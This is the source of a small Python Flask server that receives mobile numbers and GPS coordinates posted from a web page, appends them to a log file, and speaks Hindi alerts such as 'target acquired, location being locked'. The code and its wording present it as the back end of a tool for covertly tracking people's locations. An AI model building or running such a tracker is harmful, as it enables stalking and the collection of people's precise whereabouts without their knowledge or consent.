from flask import Flask, render_template, request, jsonify
import datetime
import os

app = Flask(__name__)

# 🏠 Homepage
@app.route('/')
def home():
    return render_template('index.html')

# 📱 Mobile + GPS Tracker Route
@app.route('/log', methods=['POST'])
def log():
    try:
        data = request.get_json(silent=True)
        if not data:
            os.system('espeak -v hi "कोई डेटा प्राप्त नहीं हुआ। ट्रैकिंग विफल रही।"')
            return {'status': 'error', 'message': 'No data received'}, 400

        mobile = data.get('mobile', 'Unknown')
        lat = data.get('lat')
        lon = data.get('lon')

        if lat and lon:
            timestamp = datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')
            with open('logs.txt', 'a') as f:
                f.write(f"{timestamp} - Mobile: {mobile} | Latitude: {lat}, Longitude: {lon}\n")
            os.system('espeak -v hi "Mobile number se target prapt ho gaya. Location lock kiya ja raha hai."')
            return {'status': 'logged'}
        else:
            os.system('espeak -v hi "स्थान डेटा अधूरा है। ट्रैकिंग संभव नहीं।"')
            return {'status': 'error', 'message': 'Location data missing'}, 400

    except Exception as e:
        os.system('espeak -v hi "आंतरिक सर्वर त्रुटि। ट्रैकिंग विफल रही।"')
        return {'status': 'error', 'message': str(e)}, 500

# 🛰️ GPS-only Tracker Route
@app.route('/get_location', methods=['POST'])
def get_location():
    try:
        data = request.get_json(silent=True)
        lat = data.get('latitude')
        lon = data.get('longitude')

        if lat and lon:
            timestamp = datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')
            with open("logs.txt", "a") as f:
                f.write(f"{timestamp} - [GPS] Latitude: {lat}, Longitude: {lon}\n")
            os.system('espeak -v hi "GPS se target prapt ho gaya. Sthal sanket lock kiya ja raha hai."')
            return jsonify({"status": "success"})
        else:
            return jsonify({"status": "error", "message": "GPS data missing"}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# 🚀 Run Flask Server
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
